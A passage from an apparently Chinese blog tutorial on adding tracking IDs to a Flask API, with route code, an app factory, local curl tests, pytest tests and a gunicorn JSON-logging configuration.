
@route.get("/health")
def health_check():
    # print(g.get("tracking_id", "no-tracking-id"))
    logger.info("Health check")
    return Success(data="OK")


@route.get("/users")
def get_users():
    users = user_handle.get_users()
    return Success(data=users)


@route.get("/names")
def get_names():
    names = ["Alice", "Bob", "Charlie"]
    return Success(data=names)


@route.get("/item")
def get_item():
    item = {"id": 101, "name": "Sample Item", "price": 29.99, "now": datetime.now()}
    return Success(data=item)


@route.get("/error")
def get_error():
    raise Exception("This is a test exception")

</code></pre>
<p><code>GET /api/users</code> è°ç¨äº <code>handles/</code> ä¸­çä»£ç ï¼æ¨¡ææ¥è¯¢æ°æ®åºã<code>handles/user.py</code> ä¸­çä»£ç å¦ä¸ï¼</p>
<pre><code class="language-python">import time
from typing import Any, Dict, List


def get_users() -&gt; List[Dict[str, Any]]:
    # æ¨¡ææ¥è¯¢ç¨æ·æ°æ®
    time.sleep(0.1)  # æ¨¡æå»¶è¿
    users = [{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}]
    return users
</code></pre>
<p>ä»£ç æä»¶ <code>apis/common/__init__.py</code> ä¸­å¯¼å¥åä¸ªèå¾å¹¶ç»ä¸æ´é²ãç±äºç¤ºä¾ä»£ç åªå®ä¹äºä¸ä¸ªèå¾ï¼æä»¥è¿éåå¾å¾ç®åãå¦ææå¤ä¸ªèå¾ï¼å¯ä»¥æèå¾é½æ·»å å°ä¸ä¸ªåè¡¨ä¸­ï¼å¨ Flask åºç¨ä¸­ä¸æ¬¡æ§éåæ³¨åã</p>
<pre><code class="language-python">from .common import route
# from .common import route as common_route

# routes = [
#     common_route,
# ]

__all__ = ["route"]
</code></pre>
<p>ä»£ç æä»¶ <code>apis/__init__.py</code> ä¸­æä¾ Flask åºç¨çå·¥åå½æ°ã</p>
<pre><code class="language-python">import traceback

from flask import Flask

from apis.common import route as common_route
from middlewares import tracking_id_middleware
from responses import Fail, ResourceNotFound
from pkgs.log import logger



# éè¯¯å¤çå¨
def error_handler_notfound(error):
    return ResourceNotFound()


def error_handler_generic(error):
    logger.error(traceback.format_exc())
    return Fail(data=str(error))



def create_app() -&gt; Flask:
    app = Flask(__name__)

    # æ³¨åä¸­é´ä»¶
    app = tracking_id_middleware(app)

    # æ³¨åéè¯¯å¤çå¨
    app.errorhandler(Exception)(error_handler_generic)
    app.errorhandler(404)(error_handler_notfound)

    # æ³¨åèå¾
    app.register_blueprint(common_route)

    return app

__all__ = [
    "create_app",
]
</code></pre>
<p>å¥å£ä»£ç æä»¶ <code>main.py</code></p>
<pre><code class="language-python">from apis import create_app

app = create_app()

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8000, debug=False)
</code></pre>
<h2 id="ç®åè¿è¡æµè¯">ç®åè¿è¡æµè¯</h2>
<ol>
<li>å¯å¨åºç¨</li>
</ol>
<pre><code class="language-bash"># æ¹å¼1, ç´æ¥å¯å¨, ç¨äºç®åæµè¯
python main.py

# æ¹å¼2, ä½¿ç¨ gunicorn, è¿æ¯çäº§ç¯å¢å¯å¨æ¹å¼. éç½®æä»¶é»è®¤è·¯å¾å³ ./gunicorn.conf.py
gunicorn main:app
</code></pre>
<ol start="2">
<li>curl è¯·æ± <code>/api/health</code>ãå¯ä»¥çå°ååºå¤´ä¸­å·²ç»æäº <code>X-Tracking-ID</code> å <code>X-DateTime</code></li>
</ol>
<pre><code class="language-bash">$ curl -v http://127.0.0.1:8000/api/health
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
&gt; GET /api/health HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt;
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Server: gunicorn
&lt; Date: Sat, 17 Jan 2026 08:41:07 GMT
&lt; Connection: keep-alive
&lt; Content-Type: application/json
&lt; X-Tracking-ID: 1f0adb8d-9bee-49d4-873f-31aa1437da60
&lt; X-DateTime: 2026-01-17T16:41:07+08:00
&lt; Content-Length: 61
&lt;
* Connection #0 to host 127.0.0.1 left intact
{"code": 200, "msg": "GET /api/health success", "data": "OK"}
</code></pre>
<ol start="3">
<li>curl è¯·æ± <code>/api/users</code>ãæå¨æå®è¯·æ±å¤´ä¸­ç <code>X-Tracking-ID</code>ï¼ååºæ¶ä¹ä¼ä¿æç¸åç IDã</li>
</ol>
<pre><code class="language-bash">$ curl -v http://127.0.0.1:8000/api/users -H 'X-Tracking-ID:123456'
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
* using HTTP/1.x
&gt; GET /api/users HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; X-Tracking-ID:123456
&gt;
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Server: gunicorn
&lt; Date: Sat, 17 Jan 2026 08:44:37 GMT
&lt; Connection: keep-alive
&lt; Content-Type: application/json
&lt; X-Tracking-ID: 123456
&lt; X-DateTime: 2026-01-17T16:44:37+08:00
&lt; Content-Length: 110
&lt;
* Connection #0 to host 127.0.0.1 left intact
{"code": 200, "msg": "GET /api/users success", "data": [{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}]}
</code></pre>
<h2 id="ç¼åååæµè¯">ç¼åååæµè¯</h2>
<p>ä½¿ç¨ pytest è¿è¡ååæµè¯ï¼è¿éåªæ¯ä¸ä¸ªç®åçç¤ºä¾</p>
<h3 id="éç½®-pytest">éç½® pytest</h3>
<p>éç½®æä»¶ <code>pytest.ini</code></p>
<pre><code class="language-ini">[pytest]
testpaths = "tests"
pythonpath = "."
</code></pre>
<h3 id="æµè¯ä»£ç ">æµè¯ä»£ç </h3>
<p>ä»£ç æä»¶ <code>tests/apis/test_common.py</code></p>
<pre><code class="language-python">from typing import Generator
from unittest.mock import MagicMock, patch

import pytest
from flask import Flask
from flask.testing import FlaskClient

from apis.common import route as common_route


@pytest.fixture
def app() -&gt; Generator[Flask, None, None]:
    app = Flask(__name__)
    app.config.update(
        {
            "TESTING": True,
            "DEBUG": False,
        }
    )
    app.register_blueprint(common_route)
    yield app


@pytest.fixture
def client(app: Flask) -&gt; FlaskClient:
    return app.test_client()


class TestGetHealth:
    def test_get_health_success(self, client: FlaskClient) -&gt; None:
        resp = client.get("/api/health")
        assert resp.status_code == 200

        resp_headers = resp.headers
        assert resp_headers.get("Content-Type") == "application/json"
        assert "X-Tracking-ID" in resp_headers
        assert "X-DateTime" in resp_headers

        resp_body = resp.json
        assert resp_body == {
            "code": 200,
            "msg": "GET /api/health success",
            "data": "OK",
        }


class TestGetUsers:
    @patch("apis.common.common.user_handle.get_users")
    def test_get_users(self, mock_get_users: MagicMock, client: FlaskClient) -&gt; None:
        # mock user.get_users() çè¿åå¼
        mock_get_users.return_value = [
            {"id": 1, "name": "Alice123"},
            {"id": 2, "name": "Bob456"},
        ]

        # åéè¯·æ±
        resp = client.get("/api/users")
        assert resp.status_code == 200

        resp_headers = resp.headers
        assert resp_headers.get("Content-Type") == "application/json"
        assert "X-Tracking-ID" in resp_headers
        assert "X-DateTime" in resp_headers

        # resp_body = resp.json

        mock_get_users.assert_called_once()

</code></pre>
<h3 id="æ§è¡æµè¯">æ§è¡æµè¯</h3>
<pre><code class="language-shell">pytest -vv
</code></pre>
<h2 id="éç½®-gunicorn">éç½® Gunicorn</h2>
<p>ä»£ç æä»¶ <code>gunicorn.conf.py</code>ãç®åéç½®äºä¸äºå¯å¨åæ°ï¼ä»¥åè¯·æ±æ¥å¿çæ ¼å¼ã</p>
<pre><code class="language-python"># Gunicorn éç½®æä»¶
from pathlib import Path
from multiprocessing import cpu_count
import gunicorn.glogging
from datetime import datetime

class CustomLogger(gunicorn.glogging.Logger):
    def atoms(self, resp, req, environ, request_time):
        """
        éå atoms æ¹æ³æ¥èªå®ä¹æ¥å¿å ä½ç¬¦
        """
        # è·åé»è®¤çææå ä½ç¬¦æ°æ®
        atoms = super().atoms(resp, req, environ, request_time)
        
        # èªå®ä¹ 't' (æ¶é´æ³) çæ ¼å¼
        now = datetime.now().astimezone()
        atoms['t'] = now.isoformat(timespec="seconds")
        
        return atoms
    

# é¢å è½½åºç¨ä»£ç 
preload_app = True

# å·¥ä½è¿ç¨æ°éï¼éå¸¸æ¯ CPU æ ¸å¿æ°ç 2 åå  1
# workers = int(cpu_count() * 2 + 1)
workers = 2

# ä½¿ç¨ gevent å¼æ­¥ worker ç±»åï¼éå I/O å¯éååºç¨
# æ³¨æï¼gevent worker ä¸ä½¿ç¨ threads åæ°ï¼èæ¯ä½¿ç¨åç¨è¿è¡å¹¶åå¤ç
worker_class = "gevent"

# æ¯ä¸ª gevent worker å¯å¤ççæå¤§å¹¶åè¿æ¥æ°
worker_connections = 2000

# ç»å®å°ååç«¯å£
bind = "127.0.0.1:8000"

# è¿ç¨åç§°
proc_name = "flask-dev"

# PID æä»¶è·¯å¾
pidfile = str(Path(__file__).parent / "tmp" / "gunicorn.pid")

logger_class = CustomLogger
access_log_format = (
    '{"@timestamp": "%(t)s", '
    '"remote_addr": "%(h)s", '
    '"protocol": "%(H)s", '
    '"host": "%({host}i)s", '
    '"request_method": "%(m)s", '
    '"request_path": "%(U)s", '
    '"status_code": %(s)s, '
    '"response_length": %(b)s, '
    '"referer": "%(f)s", '
    '"user_agent": "%(a)s", '
    '"x_tracking_id": "%({x-tracking-id}i)s", '
    '"request_time": %(L)s}'
)

# è®¿é®æ¥å¿è·¯å¾
accesslog = str(Path(__file__).parent / "logs" / "access.log")

# éè¯¯æ¥å¿è·¯å¾
errorlog = str(Path(__file__).parent / "logs" / "error.log")

# æ¥å¿çº§å«
loglevel = "debug"
</code></pre>
<p>è¾åºçæ¥å¿æ ¼å¼ãå¯ä»¥çå°æ¥å¿æ ¼å¼ç¬¦å JSON è§èï¼ä¾¿äº Filebeat æ¶éåå¨ Kibana ä¸æ£ç´¢ã</p>
<pre><code class="language-shell">$ tail -n 1 logs/access.log | python3 -m json.tool
{
    "@timestamp": "2026-01-17T16:44:37+08:00",
    "remote_addr": "127.0.0.1",
    "protocol": "HTTP/1.1",
    "host": "127.0.0.1:8000",
    "request_method": "GET",
    "request_path": "/api/users",
    "status_code": 200,
    "response_length": 110,
    "referer": "-",
    "user_agent": "curl/8.14.1",
    "x_tracking_id": "123456",
    "request_time": 0.102042
}
</code></pre>
<h2 id="è¡¥å">è¡¥å</h2>
<h3 id="å¨å±å¯¹è±¡-g-çæ³¨æäºé¡¹">å¨å±å¯¹è±¡ g çæ³¨æäºé¡¹</h3>
<ol>
<li><code>g</code> ä¸æ¯è¿ç¨æçº¿ç¨å±äº«çå¨å±åéï¼è¯·åªå¨è¯·æ±å¤çæµç¨ä¸­ä½¿ç¨ <code>g</code>ã</li>
<li>å¦æè§å¾å½æ°ä¸­å¯å¨äºåå°çº¿ç¨æå¼æ­¥ä»»å¡ï¼å¨å­çº¿ç¨ä¸­ç´æ¥è®¿é® <code>g</code> éå¸¸ä¼æ¥éæè·åä¸å°æ°æ®ãè¿æ¶å»ºè®®æ¾å¼ä¼ éæ°æ®ã</li>
<li>ä¸è¦å¨ <code>g</code> ä¸­å­å¨å¤§æä»¶ææ°æ®å¯¹è±¡ï¼å¦åä¼å ç¨è¿é«åå­ã</li>
<li><code>g</code> ä¸æ¯ <code>session</code>ã</li>
</ol>

</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/XY-Heruo/" target="_blank">è±ééä½ç°</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/XY-Heruo/p/19496753" target="_blank">https://www.cnblogs.com/XY-Heruo/p/19496753</a></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-17 17:22">2026-01-17 17:22</span>&nbsp;
<a href="https://www.cnblogs.com/XY-Heruo">è±ééä½ç°</a>&nbsp;
éè¯»(<span id="post_view_count">14</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19496753);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19496753', targetLink: 'https://www.cnblogs.com/XY-Heruo/p/19496753', title: '[python]Flask - Tracking IDçè®¾è®¡' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>